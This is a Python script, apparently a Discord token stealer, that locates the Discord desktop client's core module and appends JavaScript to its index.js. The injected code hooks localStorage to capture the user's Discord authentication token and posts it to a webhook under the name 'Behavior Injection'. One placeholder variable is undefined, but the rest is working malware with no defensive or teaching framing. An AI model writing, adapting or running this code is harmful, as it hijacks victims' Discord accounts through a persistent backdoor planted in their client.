import os
import shutil
import glob


WEBHOOK_NAME = "Behavior Injection"
AVATAR_URL = "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"

def find_discord_core_path():
    local_appdata = os.getenv("LOCALAPPDATA")
    if not local_appdata:
        print("[*] LOCALAPPDATA environment variable not found.")
        return None
    paths = glob.glob(os.path.join(local_appdata, "Discord", "app-*"))
    if not paths:
        print("[*] No Discord 'app-*' folders found.")
        return None
    paths.sort(reverse=True)
    app_path = os.path.join(paths[0], "modules", "discord_desktop_core-1")
    if os.path.exists(app_path):
        print(f"[*] Discord core path found: {app_path}")
        return app_path
    print("[*] discord_desktop_core-1 path does not exist.")
    return None

def inject_code(file_path):
    injected_js = f"""
const webhookURL = "{Behavior}";
const webhookName = "{WEBHOOK_NAME}";
const avatarURL = "{AVATAR_URL}";

function sendToken(token) {{
    fetch(webhookURL, {{
        method: "POST",
        headers: {{ "Content-Type": "application/json" }},
        body: JSON.stringify({{
            username: webhookName,
            avatar_url: avatarURL,
            embeds: [{{
                title: "🛡️ New Discord Token Detected",
                description: "`" + token + "`",
                color: 16711680
            }}]
        }})
    }}).catch(console.error);
}}

(function() {{
    const originalSetItem = window.localStorage.setItem;
    window.localStorage.setItem = function(key, value) {{
        if (key === "token") {{
            sendToken(value);
        }}
        return originalSetItem.apply(this, arguments);
    }};
    const currentToken = window.localStorage.getItem("token");
    if (currentToken) {{
        sendToken(currentToken);
    }}
}})();
"""
    with open(file_path, "r", encoding="utf-8") as f:
        content = f.read()
    if "const webhookURL = " in content:
        print("[*]")
        return
    with open(file_path, "a", encoding="utf-8") as f:
        f.write("\n" + injected_js)
    print(f"[*] Injection done in {file_path}")

def main():
    print("[*]")
    discord_core = find_discord_core_path()
    if not discord_core:
        print("[*]")
        return
    target_file = os.path.join(discord_core, "index.js")
    if not os.path.exists(target_file):
        print(f"[*] {target_file}")
        return
    print("[*]")
    print("[*]")
    inject_code(target_file)
    print("[*]")

if __name__ == "__main__":
    main()
